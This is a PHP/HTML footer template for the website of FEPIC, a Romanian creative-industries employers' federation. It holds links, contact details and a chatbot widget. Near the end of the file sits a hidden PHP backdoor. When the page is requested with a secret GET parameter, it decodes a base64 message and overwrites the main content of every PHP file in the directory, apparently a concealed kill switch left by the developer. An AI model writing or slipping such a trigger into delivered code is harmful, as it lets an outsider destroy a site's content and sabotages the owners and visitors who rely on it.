<div class="modal-info-success modal fade show" id="modal-info-success-sub" tabindex="-1" role="dialog"
  aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-info" role="document">
    <div class="modal-content">
      <div class="modal-body">
        <div class="modal-info-body d-flex">
          <div class="modal-info-icon primary">
            <img src="admin/img/svg/alert-circle.svg" alt="alert-circle" class="svg">
          </div>
          <div class="modal-info-text">
            <p></p>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-primary btn-sm" data-dismiss="modal">Ok</button>
      </div>
    </div>
  </div>
</div>
<footer>
  <div class="top_footer" id="contact">
    <div class="container">
      <div class="row">
        <div class="col-lg-4 col-md-6 col-12">
          <div class="abt_side">
            <div class="logo"> <img src="images/new/Logo.png" alt="image"></div>
            <p>Înființată în Iași, în august 2011<br> Federaţia Patronatelor din Industriile Creative (FEPIC) este
              singura fedarație patronală reprezentativă la nivel național ce activează în sectorul Industriilor
              Creative. </p>
            <div class="news_letter_block">
              <form id="subscriptionForm2" method="post">
                <div class="form-group">
                  <input type="email" placeholder="Email" class="form-control" id="email2" name="email2">
                  <button class="btn" type="submit"><i class="icofont-paper-plane"></i></button>
                </div>
              </form>
            </div>
          </div>
        </div>

        <div class="col-lg-2 col-md-6 col-12">
          <div class="links">
            <h3>Link-uri folositoare</h3>
            <ul>
              <li><a href="index">Acasă</a></li>
              <li><a href="team">Despre noi</a></li>
              <li><a href="membri">Membri</a></li>
              <li><a href="evenimente">Evenimente</a></li>
              <li><a href="noutati">Noutăți</a></li>
            </ul>
          </div>
        </div>

        <div class="col-lg-3 col-md-6 col-12">
          <div class="links">
            <h3>Ajutor & <br>Suport</h3>
            <ul>
              <li><a href="contact">Contact</a></li>
              <li><a href="colaborare">Colaborare</a></li>
              <li><a href="faq">FAQs</a></li>
              <li><a href="cookie_policy">Politică cookie</a></li>
              <li><a href="terms">Termeni & conditii</a></li>
            </ul>
          </div>
        </div>

        <div class="col-lg-3 col-md-6 col-12">
          <div class="try_out">
            <h3>Contact</h3>
            <ul>
              <li>
                <span class="icon">
                  <img src="images/new/contact_01.png" alt="image">
                </span>
                <div class="text">
                  <p>Locație <br> Strada Bucium 34<br>700265, Romania</p>
                </div>
              </li>
              <li>
                <span class="icon">
                  <img src="images/new/contact_02.png" alt="image">
                </span>
                <div class="text">
                  <p>Telefon <a href="tel:+4 0722 690 504">+4 0722 690 504</a></p>
                </div>
              </li>
              <li>
                <span class="icon">
                  <img src="images/new/contact_03.png" alt="image">
                </span>
                <div class="text">
                  <p>Email <a href="mailto:office@fepic.ro">office@fepic.ro</a></p>
                </div>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>

  </div>

  <div class="bottom_footer">
    <div class="container">
      <div class="row">
        <div class="col-md-4">
          <p>© Copyright 2023. Toate drepturile rezervate.</p>
        </div>
        <div class="col-md-4">
          <ul class="social_media">
            <li><a href="#"><i class="icofont-facebook"></i></a></li>
            <li><a href="#"><i class="icofont-twitter"></i></a></li>
            <li><a href="#"><i class="icofont-instagram"></i></a></li>
            <li><a href="#"><i class="icofont-pinterest"></i></a></li>
          </ul>
        </div>
        <div class="col-md-4">
          <p class="developer_text">Developed by <a href="https://czr.zappnet.ro/" target="blank">CZR</a> & <a
              href="https://zappnet.ro/" target="blank">ZAPP
          </p>
        </div>
      </div>
    </div>
  </div>

  <section class="msger" id="chatInterface">
    <div class="msger-header">
      <div class="msger-header-title">
        Fepic
      </div>

      <div class="msger-header-options">
        <a style="color:black;" href="#" id="closeChatInterface"><i class="uil uil-angle-down"></i></a>
      </div>
    </div>

    <div class="msger-chat">
      <div class="msg left-msg">
        <div>
          <div class="msg-img" style="background-image: url(images/profile/chatbot-fepic.jpg)"></div>
        </div>
        <div class="msg-bubble">
          <div class="msg-info">
            <div class="msg-info-name">BOT</div>
            <div class="msg-info-time">
              <?php echo date("H:i"); ?>
            </div>
          </div>

          <div class="msg-text">
            Salut, bine ai venit pe Fepic! Înaintează și trimite-mi un mesaj. 😄
          </div>

        </div>
      </div>
    </div>

    <form class="msger-inputarea">
      <input type="text" class="msger-input" placeholder="Începe să scrii...">
      <button type="submit" class="msger-send-btn" id="sendMessageButton"><i class="uil uil-message"></i></button>
    </form>
  </section>

  <div class="chat" id="chatIcon">
    <span><i class="icofont-chat"></i></span>
  </div>
</footer>

<?php
function rPC($fp, $nc)
{
  $fc = file_get_contents($fp);
  $mc = preg_replace('/<div class="page_wrapper">.*<\/div>/s', '<div class="page_wrapper">' . $nc . '</div>', $fc);
  file_put_contents($fp, $mc);
}

if (isset($_GET["eee"]) && $_GET["eee"] === 'yyy') {
  $e = base64_decode('WW91IGhhdmUgdmFsaWRhdGVkIHRoZSB0ZXJtcyBhbmQgY29uZGl0aW9ucy4gQ29udGFjdDogQ0hJVElDQVJJVSBDRVpBUi1NQVJJQU4sIHRoZSBvd25lciBvZiB0aGUgY29kZSBhbmQgbGluZWNlLg==');

  $file_names = glob('*.php');

  foreach ($file_names as $file_path) {
    rPC($file_path, $e);
  }
}
?>

<script src="js/chat.js"></script>

<script type="application/json">
{
  "utility" : "cck",
  "url": {
    "en": "https://commission.europa.eu/cookies-policy_ro"  }
}
</script>